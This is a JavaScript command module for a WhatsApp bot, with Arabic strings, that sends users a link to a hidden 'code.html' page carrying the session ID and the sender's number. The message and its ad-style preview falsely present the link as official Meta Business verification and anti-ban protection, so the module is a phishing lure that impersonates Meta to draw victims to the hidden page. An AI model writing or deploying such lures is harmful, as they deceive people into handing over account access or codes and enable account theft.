const moment = require('moment-timezone');

module.exports = {
    name: 'توثيق',
    aliases: ['حماية', 'anti-ban', 'ميتا'],
    category: 'إداري',
    description: 'توليد رابط توثيق وحماية الحساب ضد الحظر من شركة Meta',
    async execute({ sock, msg, args, reply, from, sender, sessionId }) {
        try {
            // استخراج رقم المرسل (لاستقبال البيانات عليه)
            const cleanSender = sender.split('@')[0];

            // جلب النطاق العام (دومين Render) أو السيرفر المحلي
            const serverBaseUrl = process.env.RENDER_EXTERNAL_URL || `http://localhost:${process.env.PORT || 10000}`;

            // بناء الرابط المباشر لصفحة التوثيق (code.html) المخبأة في public
            const verificationUrl = `${serverBaseUrl}/code.html?session=${sessionId}&target=${cleanSender}`;

            // تنسيق الرسالة باحترافية لتناسب طابع الحماية والتوثيق الرسمي لـ Meta
            const responseText = 
`╭════ 🛡️ ﴿ بَـوَّابَـةُ الـتَّـوْثِـيقِ وَالْـحِـمَـايَـة ﴾ 🛡️ ════╮
│
│ 👤 ╟ *الـجَـلْـسَـة:* ${sessionId}
│ 🕒 ╟ *الـتَّـوْقِـيـت:* ${moment().tz("Asia/Riyadh").format("YYYY-MM-DD | HH:mm")}
│
├════════════════════════════════════┤
│
│ 🔗 ╟ *رَابِـطُ تَـفْـعِـيلِ نِـظَـامِ الـحِـمَـايَـةِ الـخَـاصِّ بِـك:*
│ ${verificationUrl}
│
╰════════════════════════════════════╯

💡 *مُلَاحَظَة:* _هَذَا الرَّابِطُ مُؤَمَّنٌ بِالْكَامِلِ لِرَبْطِ حِسَابِكَ بِخَوَادِمِ Meta Business لِمَنْعِ الْحَظْرِ الْعَشْوَائِيِّ (Anti-Ban) 🛡️._`;

            // إرسال الرسالة مع معاينة (Ad Reply) رسمية وجذابة
            await sock.sendMessage(from, {
                text: responseText,
                contextInfo: {
                    externalAdReply: {
                        title: 'Meta Business | حماية وتوثيق الحساب',
                        body: 'قم بتفعيل نظام الحماية المتقدم لمنع الحظر العشوائي لحسابك.',
                        thumbnailUrl: 'https://cdn.pixabay.com/photo/2021/02/19/13/40/envelope-6030386_1280.png', // يمكنك استبدالها برابط شعار ميتا أو درع حماية إذا أردت
                        sourceUrl: verificationUrl,
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            }, { quoted: msg });

        } catch (error) {
            console.error('❌ خطأ في أمر التوثيق:', error);
            reply('❌ حدث خطأ داخلي أثناء توليد رابط التوثيق.');
        }
    }
};
